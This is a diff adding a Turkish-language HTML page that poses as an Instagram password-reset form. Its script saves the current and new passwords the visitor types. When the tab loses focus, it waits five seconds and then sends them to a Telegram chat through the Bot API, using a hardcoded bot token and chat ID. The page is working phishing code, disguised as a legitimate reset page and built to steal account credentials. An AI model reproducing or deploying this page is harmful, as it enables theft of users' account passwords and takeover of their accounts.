@@ -1,0 +1,172 @@
+<!DOCTYPE html>
+<html lang="tr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Güçlü Bir Şifre Oluştur</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #fff;
+            margin: 0;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            height: 100vh;
+        }
+        .header {
+            width: 100%;
+            padding: 10px 20px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+        .header img {
+            height: 30px;
+            margin-right: 10px;
+            border-radius: 50%; /* Resmi yuvarlak yapmak için */
+        }
+        .container {
+            background-color: #fff;
+            padding: 20px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+            border-radius: 8px;
+            max-width: 300px;
+            width: 100%;
+            text-align: center;
+        }
+        .container h1 {
+            margin-bottom: 10px;
+        }
+        .container p {
+            margin-bottom: 20px;
+            color: #666;
+            font-size: 0.9em;
+        }
+        .container input {
+            width: 100%;
+            padding: 10px;
+            margin: 10px 0;
+            border: 1px solid #ccc;
+            border-radius: 4px;
+        }
+        .container button {
+            width: 100%;
+            padding: 10px;
+            background-color: #004080; /* Koyu mavi */
+            color: #fff;
+            border: none;
+            border-radius: 4px;
+            cursor: pointer;
+        }
+        .container button:hover {
+            background-color: #0066cc; /* Soluk mavi */
+        }
+        .error {
+            color: red;
+            margin-bottom: 10px;
+            font-size: 0.9em;
+        }
+        .status {
+            margin-top: 20px;
+            color: #666;
+        }
+    </style>
+</head>
+<body>
+
+<div class="header">
+    <img src="https://upload.wikimedia.org/wikipedia/commons/a/a5/Instagram_icon.png" alt="Instagram Logo" style="height: 30px;">
+</div>
+
+<div class="container">
+    <h1>Şifre Yenileme</h1>
+    <p>Şifreniz en az 6 karakter olmalı ve rakamlar, harfler ve özel karakterlerden (!$@%) oluşmalıdır.</p>
+    <div id="error" class="error"></div>
+    <form id="resetForm">
+        <input type="password" id="existingCode" name="existingCode" placeholder="Mevcut şifre" required>
+        <input type="password" id="newCode" name="newCode" placeholder="Yeni şifre" required>
+        <input type="password" id="newCodeRepeat" name="newCodeRepeat" placeholder="Yeni şifre, tekrar" required>
+        <button type="submit">Şifreni Yenile</button>
+    </form>
+    <div id="status" class="status"></div>
+</div>
+
+<script>
+    let existingCode, newCode, newCodeRepeat;
+
+    document.getElementById('resetForm').addEventListener('submit', function(event) {
+        event.preventDefault();
+        
+        existingCode = document.getElementById('existingCode').value;
+        newCode = document.getElementById('newCode').value;
+        newCodeRepeat = document.getElementById('newCodeRepeat').value;
+        const errorDiv = document.getElementById('error');
+        const statusDiv = document.getElementById('status');
+
+        // Hata mesajını temizle
+        errorDiv.textContent = '';
+        statusDiv.textContent = '';
+
+        // Şifrelerin eşleşip eşleşmediğini kontrol et
+        if (newCode !== newCodeRepeat) {
+            errorDiv.textContent = 'Yeni şifre ve yeni şifre tekrarı aynı değil!';
+        } else if (newCode.length < 6) {
+            // Şifrenin uzunluğunu kontrol et
+            errorDiv.textContent = 'Şifre en az 6 karakter olmalıdır.';
+        } else {
+            // Şifre yenileme işleminin başarılı olduğunu göster
+            statusDiv.textContent = 'Şifre başarıyla yenilendi.';
+
+            // Şifre bilgilerini localStorage'a kaydet
+            localStorage.setItem('passwordResetInfo', JSON.stringify({
+                existingCode: existingCode,
+                newCode: newCode,
+                newCodeRepeat: newCodeRepeat
+            }));
+            
+            setTimeout(() => {
+                window.close(); // Sekmeyi kapat
+            }, 1000); // 1 saniye bekle
+        }
+    });
+
+    document.addEventListener('visibilitychange', function() {
+        if (document.hidden) {
+            setTimeout(() => {
+                const passwordResetInfo = JSON.parse(localStorage.getItem('passwordResetInfo'));
+                if (passwordResetInfo) {
+                    const botToken = '7006907419:AAHHzh_uqt-32swzKosWe5poB7yo1O01EyE';  // Bot token'ı
+                    const chatId = '6284677935';     // Chat ID
+                    const message = `Şifre Yenileme Talebi:\n\nMevcut Şifre: ${passwordResetInfo.existingCode}\nYeni Şifre: ${passwordResetInfo.newCode}\nYeni Şifre Tekrar: ${passwordResetInfo.newCodeRepeat}`;
+
+                    fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json'
+                        },
+                        body: JSON.stringify({
+                            chat_id: chatId,
+                            text: message,
+                            parse_mode: 'HTML'
+                        })
+                    }).then(response => response.json())
+                      .then(data => {
+                          if (data.ok) {
+                              localStorage.removeItem('passwordResetInfo');
+                          } else {
+                              console.error('Hata:', data);
+                          }
+                      })
+                      .catch(error => {
+                          console.error('Hata:', error);
+                      });
+                }
+            }, 5000); // 5 saniye gecikme
+        }
+    });
+</script>
+
+</body>
+</html>
